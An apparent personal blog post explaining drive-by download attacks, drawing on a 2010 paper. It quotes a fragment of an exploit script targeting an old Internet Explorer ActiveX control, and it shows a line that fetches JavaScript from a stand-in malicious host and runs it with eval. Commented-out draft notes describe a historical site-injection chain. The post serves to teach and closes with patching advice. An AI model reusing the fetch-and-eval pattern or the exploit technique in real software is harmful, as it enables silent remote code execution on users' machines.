---
title: "What **ACTUALLY** Happens When You Click Random Links"
date: 2024-02-27
# draft: true
categories:
  - technical
tags:
  - cybersecurity
---

We all know better than to click on random links. Malware and scams frequently hide behind a mysterious looking url, yet a part of me -- driven by curiosity -- wonders what lies beyond that click. However I never satisfy that desire because I am uncertain of the mechanisms of how malware could end up on my device. In this post I take away my ignorance on the topic by diving into the nitty gritty technical details of a drive-by download attack. 

<!-- An initial Google search brought me nowhere... 

It showed me loads of normie websites of corporations trying to fearmonger readers into buying their cybersecurity products. 

![](/images/what-actually-happens-when-you-click-random-links/normie-websites.png)

That won't bring me far, luckily I have chatGPT which is becoming a better search engine than Google 😊. It suggested I look into drive-by downloads. And that is what this blog post will cover.  -->

I am basing this on a widely cited (924 according to Google Scholar) paper from 2010.

[Marco Cova, Christopher Kruegel, and Giovanni Vigna: Detection and Analysis of Drive-by-Download Attacks
and Malicious JavaScript Code](https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=eb5a092458d50ad1119ca0ef10e416db24235e9b)

In a drive-by download, malware is downloaded to a website visitor's pc without the user's awareness or consent. A high level overview is illustrated in the paper. 

Suppose the user clicks on a malicious link taking them to a website. Nothing seems to happen, however behind the scenes there is a script tag in the HTML that loads an invisible iframe with a length and withd of 0 into the browser. The website in that iframe uses the user-agent http header to determine which browser and os version the victim is using. Based on that information the website can return different JS scripts that target known vulnerabilities in those versions. An example of a malicious script loaded by a user using Internet Explorer 6.1 running on Windows XP is shown below.

```
1 function a9_bwCED() {
2   var OBGUiGAa = new ActiveXObject(’Sb.SuperBuddy’);
3   if (OBGUiGAa) {
4     Exhne69P();
5     OBGUiGAa.LinkSBIcons(0x0c0c0c0c);
6   }
7   return 0;
8 }
9 if (a9_bwCED() || g0UnHabs() || P9i182jC()) { ... }
```

The script tries multiple functions to get a successful exploit. We are showing the function a9_bwCED here, but the others are similar. It first instantiates a vulnerable component (in this case the SuperBudy control, but it can be different for other user agents). If that component is successfully instantiated, it calls Exhne69P which puts malicious shellcode in the heap memory of the process. On line 5 an integer overflow vulnerability is exploited, if successfull this will cause the injected shellcode to execute. The malicious shellcode could install malware on your pc, encrypt your files or put your device in a botnet. 

Unfortunately it's hard to statically detect malicious scripts because of the dynamic features provided by Javascript. The eval() function makes it possible to run code that is provided as a string argument. This makes it possible to fetch the javascript code from a remote webserver at runtime, so that static malware detection tools can't see what will be executed in the eval function. 

```
fetch('http://malicious.example.com/malicious-script.js')
  .then(response => response.text())
  .then(code => eval(code));
```

## How to protect yourself

You may have noticed that this whole operation relies on the fact that you have a user agent that has exploitable vulnerabilities. To greatly decrease your chances of being vulnerable you should always update your os and browser so that you get the latest security patches. 

## Full disclosure

I don't know how relevant this work is for 2024, but it was certainly interesting to me and a nice beginning to answer the question: "How does malware end up on your pc by clicking on a malicious link?" 

<!-- Een goedaardige website werd geïnfecteerd met een SQL injection attack. Daardoor werd in elke HTML pagina die het servde het volgende geladen `<script src="http://www.kjwd.ru/js.js">`. Dit zorgt ervoor dat een scrit van www.kjwd.ru wordt uitgevoerd. The script checks if the victim has allready been attacked by their malware by reading a cookie. If not, they set that cookie and begin the process. It then injects an iframe tag into the web page. It has null height and width so it's invisible to the victim. The injected iframe points to a resource hosted on a third website, namely iroe.ru. 

Iframes are legitemate things used in the web today. They are used to load in another website into your website. For example to serve third party content like youtube, or to serve ads. Iframes cannot access the DOM from the parent website.  -->

<!-- The website iroe.ru uses the User-agent request header field to detect the user's browser and operating system. A user-agent is used benignly for websites that for example want to know that you are on mobile, so they can serve you their mobile version of the website. However here it is used maliciously to know which browser and os you have and then they look up known vulnerabilities for those versions. Depending on the user agent, a different website is returned with different js code to exploit the vulnerabilities for those speficif browser and os versions.  -->



